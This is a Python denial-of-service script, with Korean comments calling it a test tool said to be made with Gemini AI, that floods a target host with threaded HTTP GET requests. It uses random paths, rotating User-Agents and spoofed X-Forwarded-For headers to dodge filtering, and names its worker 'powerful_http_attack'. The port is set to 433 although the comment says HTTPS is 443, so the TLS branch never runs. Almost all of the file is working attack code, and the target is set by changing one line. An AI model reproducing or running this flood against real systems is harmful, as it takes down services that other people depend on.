# 사용으로 인한 피해 및 손실, 법적 피해 보상은 모두 공격자(스크립트 실행자) 에게 있음을 숙지 하였음을 인지한 상태로 실행하십시오.
# 이 코드는 Gemini Ai 로 제작된 코드 입니다.
# 이 코드는 오픈소스 이며 "전혀 피해의 목적" 이 아닌 "테스트" 용도로 만들어 졌습니다.

# stop 을 터미널에 입력하면, 코드의 실행이 중단 됩니다.

import socket
import ssl
import threading
import random
import sys
import os
import time  # 시간 지연을 위해 추가

# --- 설정 정보 ---
target_host = "127.0.0.1"
target_port = 433 # HTTP는 80, HTTPS는 443
max_threads = 100  # target_host 에 보낼 스레드 한도 수
batch_size = 10  # 한 번에 생성할 스레드 수
interval = 3  # 대기 시간 (초)
stop_flag = False

# 3초 마다 한번씩 스레드를 생성합니다. max_threads 에 누적 스레드가 도달하면 공격이 중단 됩니다.

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]


def get_payload():
    random_path = "/" + os.urandom(4).hex()
    ua = random.choice(user_agents)
    payload = f"GET {random_path} HTTP/1.1\r\n"
    payload += f"Host: {target_host}\r\n"
    payload += f"User-Agent: {ua}\r\n"
    payload += "Accept: */*\r\n"
    payload += "Accept-Encoding: gzip, deflate, br\r\n"
    payload += "Connection: keep-alive\r\n"
    payload += f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
    payload += "Content-Length: 0\r\n\r\n"
    return payload.encode()


def powerful_http_attack():
    global stop_flag
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if target_port == 443:
                conn = context.wrap_socket(s, server_hostname=target_host)
            else:
                conn = s
            conn.connect((target_host, target_port))
            for _ in range(10):
                conn.sendall(get_payload())
        except:
            continue


# --- 점진적 스레드 생성 제어 ---
def thread_manager():
    global stop_flag
    current_count = 0
    print(f"[*] 테스트 시작: {target_host}:{target_port}")
    print(f"[*] {interval}초마다 {batch_size}개씩, 최대 {max_threads}개까지 생성합니다.")

    while current_count < max_threads and not stop_flag:
        # 목표 수치까지 부족한 만큼만 생성 (마지막 루프 처리)
        to_create = min(batch_size, max_threads - current_count)

        for _ in range(to_create):
            if stop_flag: break
            t = threading.Thread(target=powerful_http_attack)
            t.daemon = True
            t.start()

        current_count += to_create
        print(f"[+] 현재 활성화된 스레드: {current_count}개")

        if current_count < max_threads and not stop_flag:
            time.sleep(interval)


# 메인 실행부
# 스레드 생성을 별도 관리 스레드에서 실행 (stop 입력을 방해하지 않기 위함)
manager = threading.Thread(target=thread_manager)
manager.daemon = True
manager.start()

print("[*] 종료하려면 'stop'을 입력하세요.")

while True:
    line = sys.stdin.readline().strip().lower()
    if line == "stop":
        stop_flag = True
        print("[!] 모든 공격 스레드에 중지 명령을 내렸습니다.")
        break

print("[*] 테스트 종료.")